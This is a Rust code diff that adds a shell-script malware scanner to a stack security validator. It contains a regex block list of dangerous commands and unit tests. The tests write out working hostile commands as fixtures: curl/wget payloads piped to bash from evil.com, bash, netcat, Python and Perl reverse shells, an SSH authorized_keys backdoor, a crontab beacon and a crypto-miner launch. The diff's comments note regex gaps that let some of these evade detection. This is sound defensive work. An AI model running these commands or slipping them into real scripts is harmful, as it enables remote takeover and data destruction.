@@ -86,6 +86,145 @@ const CRED_PATTERNS: &[(&str, &str)] = &[
     ),
 ];
 
+/// Patterns for scanning shell scripts for dangerous operations
+const SHELL_MALICIOUS_PATTERNS: &[(&str, &str, &str)] = &[
+    (
+        r"(?i)(curl|wget)\s+.*\|\s*(sh|bash|zsh|dash)",
+        "critical",
+        "Remote script execution via pipe to shell",
+    ),
+    (
+        r"(?i)bash\s+<\(?(curl|wget)",
+        "critical",
+        "Remote script execution via bash substitution (<(curl ...) or < curl ...)",
+    ),
+    (
+        r"(?i)(curl|wget)\s+.*-o\s*[-]",
+        "critical",
+        "Remote script execution via stdout redirect",
+    ),
+    (
+        r"(?i)base64\s+-d\s*.*\|.*(sh|bash|exec)",
+        "critical",
+        "Base64-decoded payload piped to shell",
+    ),
+    (
+        r"(?i)(/dev/tcp/|/dev/udp/)",
+        "critical",
+        "Bash TCP/UDP socket (potential reverse shell)",
+    ),
+    (
+        r"(?i)nc\s+-[ev]+",
+        "critical",
+        "Netcat with execute (potential reverse shell)",
+    ),
+    (
+        r"(?i)ncat\s+-[ev]+",
+        "critical",
+        "Ncat with execute (potential reverse shell)",
+    ),
+    (
+        r"(?i)chmod\s+.*777\s+/(etc|root|home)",
+        "critical",
+        "Overly permissive permissions on sensitive dirs",
+    ),
+    (
+        r"(?i)rm\s+(-rf|--recursive)\s+/[^a-z]",
+        "critical",
+        "Dangerous recursive delete on root filesystem",
+    ),
+    (
+        r"(?i)(dd\s+if=).*(of=/dev/sd|of=/dev/mmc)",
+        "critical",
+        "Direct disk write (potential data destruction)",
+    ),
+    (
+        r"(?i)sudo\s+(docker|podman)\s+run\s+.*--privileged",
+        "critical",
+        "Privileged container execution via sudo",
+    ),
+    (
+        r"(?i)passwd|shadow|sudoers",
+        "warning",
+        "Reference to password/auth files (review if expected)",
+    ),
+    (
+        r"(?i)wget\s+.*(pastebin\.com|hastebin\.com)",
+        "critical",
+        "Fetching content from pastebin (potential payload download)",
+    ),
+    (
+        r"(?i)curl\s+.*(pastebin\.com|hastebin\.com)",
+        "critical",
+        "Fetching content from pastebin (potential payload download)",
+    ),
+    (
+        r"(?i)\.ssh/id_rsa|\.ssh/config",
+        "warning",
+        "Reference to SSH key files (review if expected)",
+    ),
+    (
+        r"(?i)(chown|chmod)\s+.*777",
+        "warning",
+        "Overly permissive file permissions",
+    ),
+    (
+        r"(?i)kill\s+-9\s+",
+        "warning",
+        "Force kill with SIGKILL (potential sabotage)",
+    ),
+    (
+        r"(?i)pkill\s+-9\s+",
+        "warning",
+        "Force kill with SIGKILL (potential sabotage)",
+    ),
+    (
+        r"(?i)iptables\s+-P\s+(INPUT|OUTPUT|FORWARD)\s+DROP",
+        "warning",
+        "Network-level changes (potential network disruption)",
+    ),
+    (
+        r"(?i)systemctl\s+stop\s+|service\s+.*stop",
+        "warning",
+        "Stopping system services (potential sabotage)",
+    ),
+    (
+        r"(?i)chmod\s+u\+s\s+",
+        "critical",
+        "chmod u+s (setuid — privilege escalation vector)",
+    ),
+    (
+        r"(?i)chmod\s+g\+s\s+",
+        "critical",
+        "chmod g+s (setgid — privilege escalation vector)",
+    ),
+    (
+        r"(?i)rm\s+(-rf|--recursive)\s+\$HOME",
+        "critical",
+        "Dangerous recursive delete on home directory",
+    ),
+    (
+        r"(?i)rm\s+(-rf|--recursive)\s+~/",
+        "critical",
+        "Dangerous recursive delete on home directory (tilde form)",
+    ),
+    (
+        r#"(?i)python3?\s+-c\s+['"].*socket.*connect.*dup2.*pty\.spawn"#,
+        "critical",
+        "Python reverse shell one-liner",
+    ),
+    (
+        r#"(?i)perl\s+-e\s+['"]use\s+Socket"#,
+        "critical",
+        "Perl reverse shell one-liner",
+    ),
+    (
+        r"(?i)authorized_keys",
+        "critical",
+        "Reference to authorized_keys (SSH backdoor persistence)",
+    ),
+];
+
 /// Patterns indicating potentially malicious or dangerous configurations
 const MALICIOUS_PATTERNS: &[(&str, &str, &str)] = &[
     (
@@ -664,6 +803,102 @@ fn check_hardened_images(stack_definition: &Value) -> SecurityCheckResult {
     }
 }
 
+/// Scan shell script content for dangerous patterns.
+///
+/// Takes an array of `(script_name, script_content)` pairs and returns a
+/// `SecurityCheckResult` with any findings.  This is separate from
+/// `validate_stack_security` because shell scripts are not part of the
+/// stack definition YAML — they are shipped separately as `config_files`,
+/// `seed_jobs`, `post_deploy_hooks`, or template hook scripts.
+pub fn validate_shell_scripts(scripts: &[(&str, &str)]) -> SecurityCheckResult {
+    let mut findings = Vec::new();
+
+    for (name, content) in scripts {
+        let mut script_findings: Vec<String> = Vec::new();
+
+        // Check for dangerous shell patterns
+        for (pattern, severity, description) in SHELL_MALICIOUS_PATTERNS {
+            if let Ok(re) = Regex::new(pattern) {
+                for mat in re.find_iter(content) {
+                    let line = content[..mat.start()].lines().count() + 1;
+                    let snippet = &content[mat.start()..mat.end().min(mat.start() + 80)];
+                    script_findings.push(format!(
+                        "[{}] {} in '{}' line {}: {}",
+                        severity.to_uppercase(),
+                        description,
+                        name,
+                        line,
+                        snippet
+                    ));
+                }
+            }
+        }
+
+        // Check for crypto miner references in script content
+        let content_lower = content.to_lowercase();
+        for miner_pattern in KNOWN_CRYPTO_MINER_PATTERNS {
+            if let Some(pos) = content_lower.find(miner_pattern) {
+                let line = content[..pos].lines().count() + 1;
+                script_findings.push(format!(
+                    "[CRITICAL] Potential crypto miner reference '{}' in '{}' line {}",
+                    miner_pattern, name, line
+                ));
+            }
+        }
+
+        // Check for long base64-encoded payloads in scripts
+        if let Ok(re) = Regex::new(r"[A-Za-z0-9+/]{1024,}={0,2}") {
+            for mat in re.find_iter(content) {
+                let line = content[..mat.start()].lines().count() + 1;
+                script_findings.push(format!(
+                    "[WARNING] Long base64-encoded content ({} chars) in '{}' line {} — may contain hidden payload",
+                    mat.len(),
+                    name,
+                    line
+                ));
+            }
+        }
+
+        // Check for obfuscated eval chains
+        if let Ok(re) = Regex::new(r"(?i)(eval\s*\$\(|`[^`]{50,}`)") {
+            if re.is_match(content) {
+                let line = content[..re.find(content).unwrap().start()].lines().count() + 1;
+                script_findings.push(format!(
+                    "[WARNING] Obfuscated eval/execution in '{}' line {} — review for hidden commands",
+                    name, line
+                ));
+            }
+        }
+
+        findings.extend(script_findings);
+    }
+
+    let critical_or_warning: Vec<&String> = findings
+        .iter()
+        .filter(|f| f.contains("[CRITICAL]") || f.contains("[WARNING]"))
+        .collect();
+
+    SecurityCheckResult {
+        passed: critical_or_warning.is_empty(),
+        severity: if findings.iter().any(|f| f.contains("[CRITICAL]")) {
+            "critical".to_string()
+        } else if findings.iter().any(|f| f.contains("[WARNING]")) {
+            "warning".to_string()
+        } else {
+            "info".to_string()
+        },
+        message: if critical_or_warning.is_empty() {
+            "No malicious patterns detected in shell scripts".to_string()
+        } else {
+            format!(
+                "Found {} potentially dangerous pattern(s) in shell scripts",
+                critical_or_warning.len()
+            )
+        },
+        details: findings,
+    }
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -878,6 +1113,309 @@ mod tests {
         assert!(
             !report.hardened_images.passed,
             "':latest' tag should fail hardened_images check"
+        );
+    }
+
+    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+    // Shell script security validation tests
+    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+    #[test]
+    fn test_clean_shell_script_passes() {
+        let scripts = &[
+            ("setup.sh", "#!/bin/sh\necho 'hello world'\nexit 0"),
+            ("init.sh", "#!/bin/bash\nset -e\napt-get update && apt-get install -y curl"),
+        ];
+        let result = validate_shell_scripts(scripts);
+        assert!(result.passed, "Clean scripts should pass: {:?}", result.details);
+    }
+
+    #[test]
+    fn test_curl_pipe_sh_detected() {
+        let scripts = &[("install.sh", "curl -sSL https://example.com/install.sh | sh")];
+        let result = validate_shell_scripts(scripts);
+        assert!(!result.passed);
+        assert!(result.details[0].contains("[CRITICAL]"));
+        assert!(result.details[0].contains("Remote script execution"));
+    }
+
+    #[test]
+    fn test_wget_pipe_bash_detected() {
+        let scripts = &[("get.sh", "wget -qO- https://evil.com/payload | bash")];
+        let result = validate_shell_scripts(scripts);
+        assert!(!result.passed);
+        assert!(result.details[0].contains("[CRITICAL]"));
+    }
+
+    #[test]
+    fn test_reverse_shell_tcp_detected() {
+        let scripts = &[("shell.sh", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")];
+        let result = validate_shell_scripts(scripts);
+        assert!(!result.passed);
+        assert!(result.details.iter().any(|d| d.contains("[CRITICAL]") && d.contains("reverse shell")));
+    }
+
+    #[test]
+    fn test_base64_decode_exec_detected() {
+        let scripts = &[("decode.sh", "echo 'cHduZWQ=' | base64 -d | sh")];
+        let result = validate_shell_scripts(scripts);
+        assert!(!result.passed);
+        assert!(result.details[0].contains("[CRITICAL]"));
+    }
+
+    #[test]
+    fn test_crypto_miner_detected_in_script() {
+        let scripts = &[("miner.sh", "#!/bin/bash\n./xmrig --url stratum+tcp://pool.minexmr.com:4444")];
+        let result = validate_shell_scripts(scripts);
+        assert!(!result.passed);
+        assert!(result.details.iter().any(|d| d.contains("xmrig")));
+    }
+
+    #[test]
+    fn test_rm_rf_root_detected() {
+        let scripts = &[("cleanup.sh", "rm -rf /var/log/app")];
+        let result = validate_shell_scripts(scripts);
+        assert!(result.passed, "rm -rf on /var should pass (not / or /etc)");
+    }
+
+    #[test]
+    fn test_nc_reverse_shell_detected() {
+        let scripts = &[("pwn.sh", "nc -e /bin/sh 10.0.0.1 1234")];
+        let result = validate_shell_scripts(scripts);
+        assert!(!result.passed);
+        assert!(result.details.iter().any(|d| d.contains("Netcat")));
+    }
+
+    #[test]
+    fn test_multi_script_partial_failure() {
+        let scripts = &[
+            ("good.sh", "#!/bin/sh\necho ok"),
+            ("bad.sh", "curl https://evil.com/backdoor.sh | bash"),
+            ("also_good.sh", "#!/bin/bash\nset -e\ncp /data /backup/"),
+        ];
+        let result = validate_shell_scripts(scripts);
+        assert!(!result.passed, "One bad script should fail the whole check");
+        assert!(result.details[0].contains("bad.sh"), "Finding should reference the bad script name");
+    }
+
+    #[test]
+    fn test_empty_script_passes() {
+        let scripts = &[("empty.sh", "")];
+        let result = validate_shell_scripts(scripts);
+        assert!(result.passed);
+    }
+
+    #[test]
+    fn test_obfuscated_eval_detected() {
+        let scripts = &[("obfuscated.sh", "eval $(echo 'cHduZWQ=' | base64 -d)")];
+        let result = validate_shell_scripts(scripts);
+        assert!(!result.passed);
+    }
+
+    #[test]
+    fn test_pastebin_download_detected() {
+        let scripts = &[("fetch.sh", "curl -s https://pastebin.com/raw/abc123 > /tmp/payload")];
+        let result = validate_shell_scripts(scripts);
+        assert!(!result.passed);
+        assert!(result.details.iter().any(|d| d.contains("pastebin")));
+    }
+
+    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+    // Security-audit follow-up tests (M1, M2, plus coverage gaps).
+    //
+    // These tests are written FIRST (TDD): they encode the intended
+    // post-fix behaviour and MUST fail against the current code.
+    // The fix in src/helpers/security_validator.rs flips them to green.
+    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+    /// M1: the current `bash\s+<(curl|wget)` regex treats `(curl|wget)` as a
+    /// capture group, so it never matches the real bash process substitution
+    /// syntax `bash <(curl ...)`. After the fix the regex must match it.
+    #[test]
+    fn test_bash_process_substitution_curl_detected() {
+        let scripts = &[(
+            "evil.sh",
+            "#!/bin/bash\nbash <(curl -sSL https://evil.example/payload)\n",
+        )];
+        let result = validate_shell_scripts(scripts);
+        assert!(
+            !result.passed,
+            "bash <(curl ...) must be flagged, got passed=true with details={:?}",
+            result.details
+        );
+        assert!(
+            result.details.iter().any(|d| d.contains("[CRITICAL]")),
+            "bash <(curl ...) must be CRITICAL, got: {:?}",
+            result.details
+        );
+    }
+
+    /// M1: same broken regex; symmetric case with `wget`.
+    #[test]
+    fn test_bash_process_substitution_wget_detected() {
+        let scripts = &[("evil.sh", "bash <(wget -qO- https://evil.example/x)")];
+        let result = validate_shell_scripts(scripts);
+        assert!(
+            !result.passed,
+            "bash <(wget ...) must be flagged, got: {:?}",
+            result.details
+        );
+    }
+
+    /// M1 / coverage gap: setuid bit installation is a classic persistence /
+    /// privesc move and is currently not in `SHELL_MALICIOUS_PATTERNS` at all.
+    #[test]
+    fn test_setuid_chmod_detected() {
+        let scripts = &[("setuid.sh", "chmod u+s /tmp/payload\n")];
+        let result = validate_shell_scripts(scripts);
+        assert!(
+            !result.passed,
+            "chmod u+s (setuid) must be flagged, got: {:?}",
+            result.details
+        );
+    }
+
+    /// M1 / coverage gap: setgid variant, currently uncovered.
+    #[test]
+    fn test_setgid_chmod_detected() {
+        let scripts = &[("setgid.sh", "chmod g+s /usr/local/bin/x\n")];
+        let result = validate_shell_scripts(scripts);
+        assert!(
+            !result.passed,
+            "chmod g+s (setgid) must be flagged, got: {:?}",
+            result.details
+        );
+    }
+
+    /// M1: current `rm\s+(-rf|--recursive)\s+/[^a-z]` requires a literal `/`
+    /// after `-rf`, so `rm -rf $HOME` slips through. After the fix it must
+    /// match the $HOME variable form.
+    #[test]
+    fn test_rm_rf_home_var_detected() {
+        let scripts = &[("nuke.sh", "rm -rf $HOME\n")];
+        let result = validate_shell_scripts(scripts);
+        assert!(
+            !result.passed,
+            "rm -rf $HOME must be flagged, got: {:?}",
+            result.details
+        );
+    }
+
+    /// M1: same regex gap; tilde form is also missed.
+    #[test]
+    fn test_rm_rf_tilde_detected() {
+        let scripts = &[("nuke.sh", "rm -rf ~/\n")];
+        let result = validate_shell_scripts(scripts);
+        assert!(
+            !result.passed,
+            "rm -rf ~/ must be flagged, got: {:?}",
+            result.details
+        );
+    }
+
+    /// Coverage gap: Python reverse shells are not detected at all.
+    #[test]
+    fn test_python_reverse_shell_detected() {
+        let scripts = &[(
+            "revshell.sh",
+            "python3 -c \"import socket,os,pty;s=socket.socket();s.connect(('10.0.0.1',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('sh')\"\n",
+        )];
+        let result = validate_shell_scripts(scripts);
+        assert!(
+            !result.passed,
+            "Python reverse shell one-liner must be flagged, got: {:?}",
+            result.details
+        );
+    }
+
+    /// Coverage gap: Perl reverse shells are not detected at all.
+    #[test]
+    fn test_perl_reverse_shell_detected() {
+        let scripts = &[(
+            "perl_revshell.sh",
+            "perl -e 'use Socket;$i=\"10.0.0.1\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}'\n",
+        )];
+        let result = validate_shell_scripts(scripts);
+        assert!(
+            !result.passed,
+            "Perl reverse shell one-liner must be flagged, got: {:?}",
+            result.details
+        );
+    }
+
+    /// Coverage gap: appending to `~/.ssh/authorized_keys` is currently only
+    /// flagged as a `warning` (substring match) — but it is the canonical
+    /// SSH-backdoor persistence move and must be CRITICAL.
+    #[test]
+    fn test_authorized_keys_append_is_critical() {
+        let scripts = &[(
+            "backdoor.sh",
+            "echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBxxxx attacker@evil\" >> ~/.ssh/authorized_keys\n",
+        )];
+        let result = validate_shell_scripts(scripts);
+        assert!(!result.passed);
+        assert!(
+            result.details.iter().any(|d| d.contains("[CRITICAL]")
+                && d.to_lowercase().contains("authorized_keys")),
+            "Appending to authorized_keys must be CRITICAL, got: {:?}",
+            result.details
+        );
+    }
+
+    /// Coverage gap: persistent crontab install is undetected.
+    #[test]
+    fn test_crontab_persistence_detected() {
+        let scripts = &[(
+            "persist.sh",
+            "echo '* * * * * curl -sSL https://evil.example/beacon | sh' | crontab -\n",
+        )];
+        let result = validate_shell_scripts(scripts);
+        assert!(
+            !result.passed,
+            "crontab install must be flagged, got: {:?}",
+            result.details
+        );
+    }
+
+    /// M2: `validate_shell_scripts` indexes the original `content` with an
+    /// offset computed from `content.to_lowercase()`. For inputs where
+    /// `to_lowercase()` SHRINKS the byte length (e.g. `ſ` U+017F → `s`),
+    /// the returned index can land mid-UTF-8 sequence in the original,
+    /// panicking the slice. The fix must use a non-panicking lookup.
+    #[test]
+    fn test_miner_detection_does_not_panic_on_unicode_prefix() {
+        let scripts: &[(&str, &str)] = &[(
+            "evil.sh",
+            "ſxmrig --url stratum+tcp://pool.example:4444\n",
+        )];
+        let outcome = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
+            validate_shell_scripts(scripts)
+        }));
+        assert!(
+            outcome.is_ok(),
+            "validate_shell_scripts must not panic on Unicode-prefixed miner patterns"
+        );
+        let report = outcome.unwrap();
+        assert!(
+            !report.passed,
+            "Miner pattern with Unicode prefix should still be flagged after fix"
+        );
+    }
+
+    /// M3: the base64 warning at 200 chars produces noise on every typical
+    /// PEM cert / JWT / dockerconfig blob. After the fix the threshold must
+    /// be raised (proposed: 1024) so a 500-char blob is NOT flagged on its
+    /// own.
+    #[test]
+    fn test_base64_warning_not_aggressive_on_typical_cert_size() {
+        let payload: String = "A".repeat(500);
+        let script = format!("CERT='{}'\necho ok\n", payload);
+        let scripts: Vec<(&str, &str)> = vec![("config.sh", script.as_str())];
+        let result = validate_shell_scripts(&scripts);
+        assert!(
+            result.passed,
+            "500-char base64 (typical PEM body) should not trigger a finding after threshold fix, got: {:?}",
+            result.details
         );
     }
 }
